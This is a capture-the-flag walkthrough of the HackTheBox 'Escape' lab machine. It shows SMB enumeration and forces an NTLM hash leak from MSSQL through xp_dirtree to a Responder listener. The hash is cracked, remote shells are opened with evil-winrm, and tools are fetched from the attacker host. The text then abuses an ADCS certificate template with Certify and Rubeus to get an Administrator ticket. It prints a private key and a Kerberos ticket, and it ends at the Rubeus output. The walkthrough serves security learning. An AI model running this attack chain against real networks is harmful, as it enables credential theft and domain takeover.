# Escape - HTB (Medium)
## IP = 10.10.11.202

### NMAP 

```

PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2023-03-24 02:34:35Z)
135/tcp  open  msrpc         Microsoft Windows RPC                                         
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn                                 
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)                                                                                   
| ssl-cert: Subject: commonName=dc.sequel.htb                                              
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:dc.sequel.htb
| Issuer: commonName=sequel-DC-CA           
| Public Key type: rsa                      
| Public Key bits: 2048                     
| Signature Algorithm: sha256WithRSAEncryption                                             
| Not valid before: 2022-11-18T21:20:35     
| Not valid after:  2023-11-18T21:20:35     
| MD5:   869f7f54b2edff74708d1a6ddf34b9bd                                                  
|_SHA-1: 742ab4522191331767395039db9b3b2e27b6f7fa                                          
|_ssl-date: 2023-03-24T02:35:57+00:00; +8h00m01s from scanner time.                        
445/tcp  open  microsoft-ds?                                                               
464/tcp  open  kpasswd5?                                                                   
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0                           
636/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)                                                                                   
| ssl-cert: Subject: commonName=dc.sequel.htb                                              
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:dc.sequel.htb
| Issuer: commonName=sequel-DC-CA                                                          
| Public Key type: rsa                                                                     
| Public Key bits: 2048                                                                    
| Signature Algorithm: sha256WithRSAEncryption                                             
| Not valid before: 2022-11-18T21:20:35                                                    
| Not valid after:  2023-11-18T21:20:35                                                    
| MD5:   869f7f54b2edff74708d1a6ddf34b9bd                                                  
|_SHA-1: 742ab4522191331767395039db9b3b2e27b6f7fa                                          
|_ssl-date: 2023-03-24T02:35:57+00:00; +8h00m00s from scanner time.                        
1433/tcp open  ms-sql-s      Microsoft SQL Server 2019 15.00.2000.00; RTM                  
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback                                   
| Issuer: commonName=SSL_Self_Signed_Fallback                                              
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2023-03-23T13:10:12
| Not valid after:  2053-03-23T13:10:12
| MD5:   2f137dec20d292708423e2c518dfeacc
|_SHA-1: 661f18c93ad9a1d86855833c19133f091d878a04
|_ms-sql-ntlm-info: ERROR: Script execution failed (use -d to debug)
|_ms-sql-info: ERROR: Script execution failed (use -d to debug)
|_ssl-date: 2023-03-24T02:35:57+00:00; +8h00m01s from scanner time.
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2023-03-24T02:35:58+00:00; +8h00m01s from scanner time.
| ssl-cert: Subject: commonName=dc.sequel.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:dc.sequel.htb
| Issuer: commonName=sequel-DC-CA
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2022-11-18T21:20:35
| Not valid after:  2023-11-18T21:20:35
| MD5:   869f7f54b2edff74708d1a6ddf34b9bd
|_SHA-1: 742ab4522191331767395039db9b3b2e27b6f7fa
3269/tcp open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2023-03-24T02:36:00+00:00; +8h00m00s from scanner time.
| ssl-cert: Subject: commonName=dc.sequel.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:dc.sequel.htb
| Issuer: commonName=sequel-DC-CA
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2022-11-18T21:20:35
| Not valid after:  2023-11-18T21:20:35
| MD5:   869f7f54b2edff74708d1a6ddf34b9bd
|_SHA-1: 742ab4522191331767395039db9b3b2e27b6f7fa
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        .NET Message Framing
49667/tcp open  msrpc         Microsoft Windows RPC
49688/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49689/tcp open  msrpc         Microsoft Windows RPC
49706/tcp open  msrpc         Microsoft Windows RPC
49714/tcp open  msrpc         Microsoft Windows RPC
53692/tcp open  msrpc         Microsoft Windows RPC
59294/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 8h00m00s, deviation: 0s, median: 7h59m59s
| smb2-security-mode: 
|   311: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2023-03-24T02:35:17
|_  start_date: N/A

```

### Enumeration

So we can see that we're working with an active directory environment. So lets do the general enums for AD.

#### SMB Enum

```

$ crackmapexec smb 10.10.11.202 --shares -u 'Anonymous' -p ''
/usr/lib/python3/dist-packages/pywerview/requester.py:144: SyntaxWarning: "is not" with a literal. Did you mean "!="?
  if result['type'] is not 'searchResEntry':
SMB         10.10.11.202    445    DC               [*] Windows 10.0 Build 17763 x64 (name:DC) (domain:sequel.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.202    445    DC               [+] sequel.htb\Anonymous: 
SMB         10.10.11.202    445    DC               [+] Enumerated shares
SMB         10.10.11.202    445    DC               Share           Permissions     Remark
SMB         10.10.11.202    445    DC               -----           -----------     ------
SMB         10.10.11.202    445    DC               ADMIN$                          Remote Admin
SMB         10.10.11.202    445    DC               C$                              Default share
SMB         10.10.11.202    445    DC               IPC$            READ            Remote IPC
SMB         10.10.11.202    445    DC               NETLOGON                        Logon server share 
SMB         10.10.11.202    445    DC               Public          READ            
SMB         10.10.11.202    445    DC               SYSVOL                          Logon server share 

$ smbclient -N //10.10.11.202/Public
Try "help" to get a list of possible commands.
smb: \> dir
  .                                   D        0  Sat Nov 19 06:51:25 2022
  ..                                  D        0  Sat Nov 19 06:51:25 2022
  SQL Server Procedures.pdf           A    49551  Fri Nov 18 08:39:43 2022

                5184255 blocks of size 4096. 1444015 blocks available
smb: \> mget *
```

When using CME to display the smb shares we can see when using an anonymous user it will display the shares. There is a non-default share there called 'Public' so we can login to the smb shell and download everything there.


### MSSQL Login / Get NTLM ash

So when open the pdf you can see some mssql credentials so we can use them to login to the sql server.

```

(Window 1)$ mssqlclient.py sequel.htb/PublicUser:GuestUserCantWrite1@10.10.11.202
(Window 2)$ sudo responder -I tun0
(Window 1)SQL> xp_dirtree "\\10.10.14.224\hash_me\"

(Window 2):
[SMB] NTLMv2-SSP Client   : 10.10.11.202
[SMB] NTLMv2-SSP Username : sequel\sql_svc
[SMB] NTLMv2-SSP Hash     : sql_svc::sequel:726142a3419d4162:3BE6D18FB2F3E87340F35170346F5844:010100000000000080CB0311B75DD90124E8F4EF2B3747C400000000020008004900580032004D0001001E00570049004E002D0037004C00380053004A004C005800490057004F004F0004003400570049004E002D0037004C00380053004A004C005800490057004F004F002E004900580032004D002E004C004F00430041004C00030014004900580032004D002E004C004F00430041004C00050014004900580032004D002E004C004F00430041004C000700080080CB0311B75DD901060004000200000008003000300000000000000000000000003000005C4F0B64257AF3EBBAC18765B2C69A05BC304E0FE424542E0EE712D6E39D61290A001000000000000000000000000000000000000900220063006900660073002F00310030002E00310030002E00310034002E003200320034000000000000000000

```

What I did here is take the servers hash by calling my host-ip with a non created folder. Now let's crack the hash with hashcat.

```

>hashcat.exe -m 5600 hashes\Escape.ntlmv2 ..\rockyou.txt -O
SQL_SVC::sequel:726142a3419d4162:3be6d18fb2f3e87340f35170346f5844:010100000000000080cb0311b75dd90124e8f4ef2b3747c4000000000200080049900580032004d0001001e00570049004e002d0037004c00380053004a004c005800490057004f004f0004003400570049004e002d0037004c00380053004a004c0058800490057004f004f002e004900580032004d002e004c004f00430041004c00030014004900580032004d002e004c004f00430041004c00050014004900580032004dd002e004c004f00430041004c000700080080cb0311b75dd901060004000200000008003000300000000000000000000000003000005c4f0b64257af3ebbac18765b22c69a05bc304e0fe424542e0ee712d6e39d61290a001000000000000000000000000000000000000900220063006900660073002f00310030002e00310030002e003110034002e003200320034000000000000000000:REGGIE1234ronnie

```

### Enumeration On Target Machine

Now we can login as the `sql_svc` user:


```

$ evil-winrm -u 'sql_svc' -p 'REGGIE1234ronnie' -i 10.10.11.202
C:\SQLServer\Logs> type ERRORLOG.BAK

2022-11-18 13:43:07.44 Logon       Logon failed for user 'sequel.htb\Ryan.Cooper'. Reason: Password did not match that for the login provided.
 [CLIENT: 127.0.0.1]
2022-11-18 13:43:07.48 Logon       Error: 18456, Severity: 14, State: 8.
2022-11-18 13:43:07.48 Logon       Logon failed for user 'NuclearMosquito3'. Reason: Password did not match that for the login provided.

```

So I found the SQLServer directory inside it there was a `Logs` directory inside that Logs directory there's a file called `ERRORLOG.BAK` and it has all the log for the sql server, inside the file you can see that the user `Ryan.Cooper` failed to login, then we can see a user called `NuclearMosquito3` try to log in, this username format isn't common in AD environments so I'm guessing the ryan.cooper user got confused and accidentally wrote his password in the username field. So I tried the following:


```

$ evil-winrm -i 10.10.11.202 -u 'ryan.cooper' -p 'NuclearMosquito3' -s www
*Evil-WinRM* PS C:\Users\Ryan.Cooper\Desktop> type user.txt
3decaf78bf523affad79183dac8fc1da

```

The `-s www` is downloading to the machine everything I have in the 'www' directory. In my www directory there is the `PowerView.ps1` file which you can download from here: https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1

So after you enter that command you can run 

```
*Evil-WinRM* PS C:\Users\Ryan.Cooper\Desktop> PowerView.ps1
```

After running that you'll have all the command menu from PowerView.

### Privilege Escalation


```

*Evil-WinRM* PS C:\Users\Ryan.Cooper\Documents> whoami /groups

GROUP INFORMATION
-----------------

Group Name                                  Type             SID          Attributes
=========================================== ================ ============ ==================================================
Everyone                                    Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
BUILTIN\Remote Management Users             Alias            S-1-5-32-580 Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                               Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group
BUILTIN\Pre-Windows 2000 Compatible Access  Alias            S-1-5-32-554 Mandatory group, Enabled by default, Enabled group
BUILTIN\Certificate Service DCOM Access     Alias            S-1-5-32-574 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NETWORK                        Well-known group S-1-5-2      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users            Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization              Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NTLM Authentication            Well-known group S-1-5-64-10  Mandatory group, Enabled by default, Enabled group
Mandatory Label\Medium Plus Mandatory Level Label            S-1-16-8448


```


When running the this command to show what groups we are related with we can see that the `Certificate Service DCOM Access` is enabled. 

Now we want download a couple of tools and upload them to the target machine:


```

(Host)$ wget https://raw.githubusercontent.com/cfalta/PoshADCS/master/ADCS.ps1 && git clone https://github.com/Flangvik/SharpCollection.git

(Host)$ python3 -m http.server 80
(Target)*Evil-WinRM* PS C:\Users\Ryan.Cooper\Documents> curl http://10.10.14.224/ADCS.ps1 -o ADCS.ps1
(Target)*Evil-WinRM* PS C:\Users\Ryan.Cooper\Documents> curl http://10.10.14.224/Certify.exe -o Certify.exe
(Target)*Evil-WinRM* PS C:\Users\Ryan.Cooper\Documents> curl http://10.10.14.224/Rubeus.exe -o Rubeus.exe


```

Just to note that the http server needs to be activated on the directory which the files are located at.

Great so now we look something like this:

```

*Evil-WinRM* PS C:\Users\Ryan.Cooper\Documents> dir


    Directory: C:\Users\Ryan.Cooper\Documents


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----        3/24/2023   5:39 PM          30022 ADCS.ps1
-a----        3/24/2023   5:20 PM         177664 Certify.exe
-a----        3/24/2023   5:21 PM         453632 Rubeus.exe

```


```

*Evil-WinRM* PS C:\Users\Ryan.Cooper\Documents> .\Certify.exe find /vulnerable /currentuser                                         
                                                                                                                                    
   _____          _   _  __                                                                                                         
  / ____|        | | (_)/ _|                                                                                                        
 | |     ___ _ __| |_ _| |_ _   _                                                                                                   
 | |    / _ \ '__| __| |  _| | | |                                                                                                  
 | |___|  __/ |  | |_| | | | |_| |                                                                                                  
  \_____\___|_|   \__|_|_|  \__, |                                                                                                  
                             __/ |                                                                                                  
                            |___./                                                                                                  
  v1.1.0                                                                                                                            
                                                                                                                                    
[*] Action: Find certificate templates                                                                                              
[*] Using current user's unrolled group SIDs for vulnerability checks.                                                              
[*] Using the search base 'CN=Configuration,DC=sequel,DC=htb'                                                                       
                                                                                                                                    
[*] Listing info about the Enterprise CA 'sequel-DC-CA'                                                                             
                                                                                                                                    
    Enterprise CA Name            : sequel-DC-CA                                                                                    
    DNS Hostname                  : dc.sequel.htb                                                                                   
    FullName                      : dc.sequel.htb\sequel-DC-CA                                                                      
    Flags                         : SUPPORTS_NT_AUTHENTICATION, CA_SERVERTYPE_ADVANCED                                              
    Cert SubjectName              : CN=sequel-DC-CA, DC=sequel, DC=htb                                                              
    Cert Thumbprint               : A263EA89CAFE503BB33513E359747FD262F91A56                                                        
    Cert Serial                   : 1EF2FA9A7E6EADAD4F5382F4CE283101                                                                
    Cert Start Date               : 11/18/2022 12:58:46 PM
    Cert End Date                 : 11/18/2121 1:08:46 PM
    Cert Chain                    : CN=sequel-DC-CA,DC=sequel,DC=htb
    UserSpecifiedSAN              : Disabled
    CA Permissions                :
      Owner: BUILTIN\Administrators        S-1-5-32-544

      Access Rights                                     Principal

      Allow  Enroll                                     NT AUTHORITY\Authenticated UsersS-1-5-11
      Allow  ManageCA, ManageCertificates               BUILTIN\Administrators        S-1-5-32-544
      Allow  ManageCA, ManageCertificates               sequel\Domain Admins          S-1-5-21-4078382237-1492182817-2568127209-512
      Allow  ManageCA, ManageCertificates               sequel\Enterprise Admins      S-1-5-21-4078382237-1492182817-2568127209-519
    Enrollment Agent Restrictions : None

[!] Vulnerable Certificates Templates :
                                                                                                                             [0/286]
    CA Name                               : dc.sequel.htb\sequel-DC-CA
    Template Name                         : UserAuthentication
    Schema Version                        : 2
    Validity Period                       : 10 years
    Renewal Period                        : 6 weeks
    msPKI-Certificate-Name-Flag          : ENROLLEE_SUPPLIES_SUBJECT
    mspki-enrollment-flag                 : INCLUDE_SYMMETRIC_ALGORITHMS, PUBLISH_TO_DS
    Authorized Signatures Required        : 0
    pkiextendedkeyusage                   : Client Authentication, Encrypting File System, Secure Email
    mspki-certificate-application-policy  : Client Authentication, Encrypting File System, Secure Email
    Permissions
      Enrollment Permissions
        Enrollment Rights           : sequel\Domain Admins          S-1-5-21-4078382237-1492182817-2568127209-512
                                      sequel\Domain Users           S-1-5-21-4078382237-1492182817-2568127209-513
                                      sequel\Enterprise Admins      S-1-5-21-4078382237-1492182817-2568127209-519
      Object Control Permissions
        Owner                       : sequel\Administrator          S-1-5-21-4078382237-1492182817-2568127209-500
        WriteOwner Principals       : sequel\Administrator          S-1-5-21-4078382237-1492182817-2568127209-500
                                      sequel\Domain Admins          S-1-5-21-4078382237-1492182817-2568127209-512
                                      sequel\Enterprise Admins      S-1-5-21-4078382237-1492182817-2568127209-519
        WriteDacl Principals        : sequel\Administrator          S-1-5-21-4078382237-1492182817-2568127209-500
                                      sequel\Domain Admins          S-1-5-21-4078382237-1492182817-2568127209-512
                                      sequel\Enterprise Admins      S-1-5-21-4078382237-1492182817-2568127209-519
        WriteProperty Principals    : sequel\Administrator          S-1-5-21-4078382237-1492182817-2568127209-500
                                      sequel\Domain Admins          S-1-5-21-4078382237-1492182817-2568127209-512
                                      sequel\Enterprise Admins      S-1-5-21-4078382237-1492182817-2568127209-519

```

As you can see we have a vulnerable template called `UserAuthentication`. Now lets create a certificate with Admin as the SAN:

```

*Evil-WinRM* PS C:\Users\Ryan.Cooper\Documents> .\Certify.exe request /ca:dc.sequel.htb\sequel-DC-CA /template:UserAuthentication /altname:Administrator

   _____          _   _  __
  / ____|        | | (_)/ _|
 | |     ___ _ __| |_ _| |_ _   _
 | |    / _ \ '__| __| |  _| | | |
 | |___|  __/ |  | |_| | | | |_| |
  \_____\___|_|   \__|_|_|  \__, |
                             __/ |
                            |___./
  v1.1.0

[*] Action: Request a Certificates

[*] Current user context    : sequel\Ryan.Cooper
[*] No subject name specified, using current context as subject.

[*] Template                : UserAuthentication
[*] Subject                 : CN=Ryan.Cooper, CN=Users, DC=sequel, DC=htb
[*] AltName                 : Administrator

[*] Certificate Authority   : dc.sequel.htb\sequel-DC-CA

[*] CA Response             : The certificate had been issued.
[*] Request ID              : 12

[*] cert.pem         :

-----BEGIN RSA PRIVATE KEY-----
MIIEogIBAAKCAQEAv6+C9qWuz8XpzpgtB7q1ECe5WxcKncA2kN3eEW/G6iqm6YPZ
SU9YLsWrOqciZYc8zbFVKqt7wavFJcegEk7HV34BLoiMJAWTo63fx0MLPk8656fT
oO9wuQIgOZBkkGV5/5SMJi2ecbNtZmqnC8U+EpDETpVb9sDUg/zx9E04nCFoxCgy
90TL2kAWP0qG5qcdwiXZYe88Jga9q2SPl6884/ZKA06d4aNjhnXuV5P5UR+pjZaI
uGqUw1ZmMaZiORmKKAcyIa3gFPDyqrnxAxzkkz7IUTeEByBQ6rrqeAbPYqqjtOBk
6MksSHxCWMOp7OCPecrkPCHXBkgBrsw7G0OhcQIDAQABAoIBAD0/Cw1b6vsgNZB5
NwodMfUzfBoKxq2Y2NZ4zZesq1Xuwt4h7q9p1rc7GXboKClgiKEAZEH6ANTk2V00
54Rx/2eJLz97CawIzB+kUrgMR+9kyWFzUj89wjqa30kFRdyNT+nFwPIB6XpS5kWv
FijAoRC1iMPDHVs+SajSjUyNz+SyinGCEtDlCBi3aALhY5lWOc6BWN4n9NV5SSyi
lU2KYCODqNEYNQ1sHqsKyxqaJUw8yu+M4+5pD/Op/lyX1yqeveeFg6z4IPHvrd7N
lhJSnihtpgj78ITSynl4IaqUb07H17255YnPqt+nqdJjX0eeSuRv1/dkzFhPJwf/
+GOVeHECgYEA5KCDBZG+nLjs//UGHnqqEyt1PnS1cUUJM62F2jm6zd6Hly9cXqG6
FtGISr7mI/m99cnK2YQ0OVgUxiIccxFmXSkmq3Sb77mfIB7g+TUj1ikpJyiqhY7y
GBD4FgpFfRAF6JcgpSGCasH9Lkaf7vWMKg/jA12cLfo7xcEuu1JdrSsCgYEA1qK7
9iZ96FkgnJhMDh25OawFdQiyyZcGdKWnhhPfbzGX0h2g5b1g6XJa9POe62ptf2MS
AuIYJ+qrkf6LA1JFF4AIiZRtEXAYXYsSXigjmEeceFeebvuWcKTqWlZOO6ReVKXr
hmueuLs68L0iSrNJzX3sB7TZPIVUeEh8lWecNdMCgYA3+EObHW74lx0OHEH/PDBe
uQje3Vt9+1ShXh2iqvdcZtny3RlT4WvZIjqnccyNihpDDb+nOIJAd5u+VaN5WA0j
SWu6FbYHHf4isuyIlcXMLA9zErWMNM53rc/ONX2FfGK16imHw4hV8l+08H0+1sYV
lgYRUN1nNBdl9kEmgqeEOQKBgAK5jilR08dfWkqipFSJjBBvXqJduedVQ3+3mqjZ
F70RpBvGxIQmI1TTXtQ9Q4c5kqpLV68xr5zSHdt8n8crBDWIKpOUjs3p3mVRnqoT
WGBWiGX+tsQx7XcAoPkEn3miXJA2iwbp1toBhn4H6KeKHyW8s4JliVx7VNcyFGLR
LeqBAoGAdoDOaAdmQLafyUqGj31z1B/CF+dnVx2YdhF2IoE0CpLxjlOZ2FMg/0y2
YdKuT0PWMsq8FheLlf5VEIsU028x/IxL//vZFiVuXyCtE1JVrKhCRe769WHpIUK3
3rR8zugIGmD+CI3Qx/Kxm/K5p0m15k+K3Bj0dpTXSHPe6WLGTus=
-----END RSA PRIVATE KEY-----
-----BEGIN CERTIFICATE-----
MIIGEjCCBPqgAwIBAgITHgAAAAzIkYkdZTZyBgAAAAAADDANBgkqhkiG9w0BAQsF
ADBEMRMwEQYKCZImiZPyLGQBGRYDaHRiMRYwFAYKCZImiZPyLGQBGRYGc2VxdWVs
MRUwEwYDVQQDEwxzZXF1ZWwtREMtQ0EwHhcNMjMwMzI1MDQzODQ2WhcNMjUwMzI1
MDQ0ODQ2WjBTMRMwEQYKCZImiZPyLGQBGRYDaHRiMRYwFAYKCZImiZPyLGQBGRYG
c2VxdWVsMQ4wDAYDVQQDEwVVc2VyczEUMBIGA1UEAxMLUnlhbi5Db29wZXIwggEi
MA0GCSqGSIb3DQEBAQUAA4IBDwAwggEKAoIBAQC/r4L2pa7PxenOmC0HurUQJ7lb
FwqdwDaQ3d4Rb8bqKqbpg9lJT1guxas6pyJlhzzNsVUqq3vBq8Ulx6ASTsdXfgEu
iIwkBZOjrd/HQws+Tzrnp9Og73C5AiA5kGSQZXn/lIwmLZ5xs21maqcLxT4SkMRO
lVv2wNSD/PH0TTicIWjEKDL3RMvaQBY/Sobmpx3CJdlh7zwmBr2rZI+Xrzzj9koD
Tp3ho2OGde5Xk/lRH6mNloi4apTDVmYxpmI5GYooBzIhreAU8PKqufEDHOSTPshR
N4QHIFDquup4Bs9iqqO04GToySxIfEJYw6ns4I95yuQ8IdcGSAGuzDsbQ6FxAgMB
AAGjggLsMIIC6DA9BgkrBgEEAYI3FQcEMDAuBiYrBgEEAYI3FQiHq/N2hdymVof9
lTWDv8NZg4nKNYF338oIhp7sKQIBZAIBBTApBgNVHSUEIjAgBggrBgEFBQcDAgYI
KwYBBQUHAwQGCisGAQQBgjcKAwQwDgYDVR0PAQH/BAQDAgWgMDUGCSsGAQQBgjcV
CgQoMCYwCgYIKwYBBQUHAwIwCgYIKwYBBQUHAwQwDAYKKwYBBAGCNwoDBDBEBgkq
hkiG9w0BCQ8ENzA1MA4GCCqGSIb3DQMCAgIAgDAOBggqhkiG9w0DBAICAIAwBwYF
Kw4DAgcwCgYIKoZIhvcNAwcwHQYDVR0OBBYEFFDnYlrqHAz9mxuUxNNt5vjHXJBi
MCgGA1UdEQQhMB+gHQYKKwYBBAGCNxQCA6APDA1BZG1pbmlzdHJhdG9yMB8GA1Ud
IwQYMBaAFGKfMqOg8Dgg1GDAzW3F+lEwXsMVMIHEBgNVHR8EgbwwgbkwgbaggbOg
gbCGga1sZGFwOi8vL0NOPXNlcXVlbC1EQy1DQSxDTj1kYyxDTj1DRFAsQ049UHVi
bGljJTIwS2V5JTIwU2VydmljZXMsQ049U2VydmljZXMsQ049Q29uZmlndXJhdGlv
bixEQz1zZXF1ZWwsREM9aHRiP2NlcnRpZmljYXRlUmV2b2NhdGlvbkxpc3Q/YmFz
ZT9vYmplY3RDbGFzcz1jUkxEaXN0cmlidXRpb25Qb2ludDCBvQYIKwYBBQUHAQEE
gbAwga0wgaoGCCsGAQUFBzAChoGdbGRhcDovLy9DTj1zZXF1ZWwtREMtQ0EsQ049
QUlBLENOPVB1YmxpYyUyMEtleSUyMFNlcnZpY2VzLENOPVNlcnZpY2VzLENOPUNv
bmZpZ3VyYXRpb24sREM9c2VxdWVsLERDPWh0Yj9jQUNlcnRpZmljYXRlP2Jhc2U/
b2JqZWN0Q2xhc3M9Y2VydGlmaWNhdGlvbkF1dGhvcml0eTANBgkqhkiG9w0BAQsF
AAOCAQEAoZYoA/C1QcBCUZ+gkHzeKepA2xNSgxn5ftl4h1JTcJWQc2MBLcFWQw70
SuUvUQGd5X49YVjJwSSoRw8rCF/Fh+mpaWnVI5IRyra36Ramgw+mVrtRNJ/n0PSW
fhGDH+/76f3Fb9m2N5ddwr8Uq1WYnqeQeG0eV3VH43rOc3rVny4X/bHDhKV3PaU/
ZXKpf0iKKcEQ18yEb1KmqWNibSmLFVVpMp9quLqNmjcUjZyBrUTZqDiKQ1+mnCj+
kwDkVyq3XU+hPEzUS8K/SH5g0yNswtw4fA6MyIS9aqtEqyBuEuprHeud6nUSrXC/
/+O85r9onybmnLuO4cKul1IhofmuPA==
-----END CERTIFICATE-----


[*] Convert with: openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx


```

Now this is the output, you want to add the certificate and the rsa key to a file called `cert.pem`. Now run the command you got at the end.

```

$ openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx
Enter Export Password:
Verifying - Enter Export Password:

```

You don't have to enter in a password so I didn't. Now we can use `Rubeus` to get the creds via the certification we generated.

```

*Evil-WinRM* PS C:\Users\Ryan.Cooper\Documents> .\Rubeus.exe asktgt /user:Administrator /certificate:cert.pfx /getcredentials

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.2.2

[*] Action: Ask TGT

[*] Using PKINIT with etype rc4_hmac and subject: CN=Ryan.Cooper, CN=Users, DC=sequel, DC=htb
[*] Building AS-REQ (w/ PKINIT preauth) for: 'sequel.htb\Administrator'
[*] Using domain controller: fe80::2d84:7612:817c:2d02%4:88
[+] TGT request successful!
[*] base64(ticket.kirbi):

      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

  ServiceName              :  krbtgt/sequel.htb
  ServiceRealm             :  SEQUEL.HTB
  UserName                 :  Administrator
